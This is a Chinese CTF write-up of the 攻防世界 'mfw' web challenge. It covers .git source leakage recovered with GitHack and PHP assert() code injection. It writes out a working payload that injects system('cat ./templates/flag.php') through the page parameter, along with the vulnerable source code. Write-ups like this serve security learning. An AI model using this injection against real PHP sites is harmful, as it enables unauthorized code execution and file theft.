---
layout: post
title: Web进阶题-mfw
excerpt: "攻防世界进阶Web题目-mfw"
date:   2020-10-28 22:27:00
categories: [CTF]
comments: true
---

## 我的解题过程

1. 访问目标网站，Home、About、Contact页面上均未找到注入点

   * About页面介绍了使用的技术，Git、PHP、Bootstrap

2. 源码审计，网站导航栏列表项中有一条注释，发现?page=flag隐藏页面

   ```html
   <!--<li ><a href="?page=flag">My secrets</a></li> -->
   ```

3. 访问flag页面，发现页面没有任何渲染视觉效果

4. 当访问不存在的页面时，会返回"That file doesn't exist!"

5. 发现一个问题，有一个js没被加载

   * 对应源码

     ```html
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.12.4/jquery.min.js" />
     <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js" />
     ```

   * 渲染后

     ```html
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.12.4/jquery.min.js">
                 <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js" />
             </body>
         </html>
     </script>
     ```

   * 出错原因，script标签不能自封闭，会渲染出错

6. 使用Burp Suite的Proxy模块的Match & Replace功能，修正script标签的问题，发现并没有多出什么有效信息

7. 回顾之前的About页面，它提到了使用了Git，所以很有可能是到Github上去找flag，现在缺少工程名，到Github源码里应该有个flag.php文件，文件中应该存储了flag

8. 但是Contract页面中的"电话号码"在Github上使用高级检索"xxx-xxxxx extension:php"，检索文件中的内容为该电话号码，检索出近十个项目，有很多是16年的该题的writeup，寻找本来的这道题的项目

   * index.php

     ```php
     <?php
     
         if (isset($_GET['page'])) {
             $page = $_GET['page'];
         } else {
             $page = "home";
         }
     
     $file = "templates/" . $page . ".php";
     
     // I heard '..' is dangerous!
     assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
     
     // TODO: Make this look nice
     assert("file_exists('$file')") or die("That file doesn't exist!");
     
     ?>
     <html>
         <body>
         	<div class="container" style="margin-top: 50px">
     			<?php
     				require_once $file;
     			?>	
     		</div>
         </body>
     </html>
     ```

     * 拼接字符串到$file变量
     * 测试"file_exists('$file')"这个表达式的运行是否异常
     * container中require_once，加载

   * flag.php

     ```php
     <?php
     // TODO
     //$FLAG = '';
     ?>
     ```

9. 构造"flag.php','2333')===false;file_get_contents('templates/flag.php');strpos('index.php"，进行注入，但是会发现报file_exists()需要一个参数，并报"That file doesn't exist!"，通不过第二个assert

10. 构造"flag.php'); file_get_contents('templates/flag.php');print('index"注入时，会通不过第一个assert，会报strpos()需要两个参数，并报"Detected hacking attempt!"

11. 没解出来

## 别人的解决方法

1. Git源码泄露漏洞，在空目录下执行git init时，Git会创建一个.git目录，这个目录包含所有Git存储和操作的对象，本题中就是暴露在http://ip:port/.git/下，作者直接在htdocs目录下建立了git仓库，导致出现git源码泄露，而且未关闭文件夹索引显示

2. 使用[GitHack](https://github.com/lijiejie/GitHack)工具将网站暴露的源码恢复出来，"python GitHack.py http://ip:port/.git/"

   * GitHack执行结果

     ```text
     [+] Download and parse index file ...
     index.php
     templates/about.php
     templates/contact.php
     templates/flag.php
     templates/home.php
     [OK] templates/about.php
     [OK] index.php
     [OK] templates/contact.php
     [OK] templates/flag.php
     [OK] templates/home.php
     ```

   * 查看flag.php源代码，发现无有效信息，应该是网页中该文件有真正的flag，需要通过web读取该文件

     ```php
     <?php
     // TODO
     // $FLAG = '';
     ?>
     ```

   * 查看index.php网页源代码

     ```html
     <?php
     
     if (isset($_GET['page'])) {
             $page = $_GET['page'];
     } else {
             $page = "home";
     }
     
     $file = "templates/" . $page . ".php";
     
     // I heard '..' is dangerous!
     assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
     
     // TODO: Make this look nice
     assert("file_exists('$file')") or die("That file doesn't exist!");
     
     ?>
     <!DOCTYPE html>
     <html>
             <head>
                     <meta charset="utf-8">
                     <meta http-equiv="X-UA-Compatible" content="IE=edge">
                     <meta name="viewport" content="width=device-width, initial-scale=1">
     
                     <title>My PHP Website</title>
     
                     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css" />
             </head>
             <body>
                     <nav class="navbar navbar-inverse navbar-fixed-top">
                             <div class="container">
                             <div class="navbar-header">
                                     <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
                                     <span class="sr-only">Toggle navigation</span>
                                     <span class="icon-bar"></span>
                                     <span class="icon-bar"></span>
                                     <span class="icon-bar"></span>
                                     </button>
                                     <a class="navbar-brand" href="#">Project name</a>
                             </div>
                             <div id="navbar" class="collapse navbar-collapse">
                                     <ul class="nav navbar-nav">
                                     <li <?php if ($page == "home") { ?>class="active"<?php } ?>><a href="?page=home">Home</a></li>
                                     <li <?php if ($page == "about") { ?>class="active"<?php } ?>><a href="?page=about">About</a></li>
                                     <li <?php if ($page == "contact") { ?>class="active"<?php } ?>><a href="?page=contact">Contact</a></li>
                                     <!--<li <?php if ($page == "flag") { ?>class="active"<?php } ?>><a href="?page=flag">My secrets</a></li> -->
                                     </ul>
                             </div>
                         </div>
                     </nav>
     
                     <div class="container" style="margin-top: 50px">
                             <?php
                                     require_once $file;
                             ?>
     
                     </div>
     
                     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.12.4/jquery.min.js" />
                     <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js" />
             </body>
     </html>
     ```

3. 构造payload："/?page=') or system('cat ./templates/flag.php');#"，payload需要**URL编码**

4. 在服务端被拼接为assert("strpos('templates/') or system('cat ./templates/flag.php');#.php', '..') === false") or die("Detected hacking attempt!");

5. assert执行的时候，执行的代码是strpos('templates/') or system('cat ./templates/flag.php');#.php', '..') === false，#后面被注释掉了，所以真正执行的是strpos('templates/') or system('cat ./templates/flag.php');

6. 从网页源码上出现flag

   ```html
   <!--?php $FLAG="cyberpeace{fe0314e4c3ce47969444931497e77591}"; ?-->
   ```

## 独立思考

### 1. 为什么直接在浏览器中输入#，服务器端会显示运行出错？

浏览器输入的url发送给服务器时默认会被url编码，那么为什么如果不手动把#进行URL编码，服务器端就收不到#？

对于常规的Web操作来说，#是用来指导浏览器动作的，对服务器端完全无用，所以浏览器发起的请求不包括#，如果要发送#，就需要先手动给#编码避免被浏览器丢弃。

比如，访问*http://www.baidu.com?aaa=233#bbb=233')*时，使用Burp Suite进行抓包，查看HTTP请求报文如下

```http
GET /?aaa=233 HTTP/1.1
Host: www.baidu.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: 2333333333333333
Upgrade-Insecure-Requests: 1
```

可以看出#及#以后的内容在形成GET请求时被浏览器丢弃了。

### 2. #在Web中的作用有哪些？

* 在第一个#之后的任何字符都会被浏览器解释为位置标识符
* 只改变#后的内容不会触发网页重载，浏览器只会把页面滚动到相应位置
* 每一次修改#后的内容，都会在浏览器的访问历史中增加一个记录，使用"⬅"按钮，就可以回到上一个位置，使用"➡"，可以跳到历史中的下一个位置(如果有的话)
* 当#后的值发生变化时，会触发onhashchange时间
  * window.onhashchange=func
  * \<body onhashchange="func();"\>
  * window.addEventListener("hashchange",func,false)

## 产生过的疑问

1. 为什么直接在浏览器中输入#，服务器端会显示运行出错？
2. #在Web中的作用有哪些？

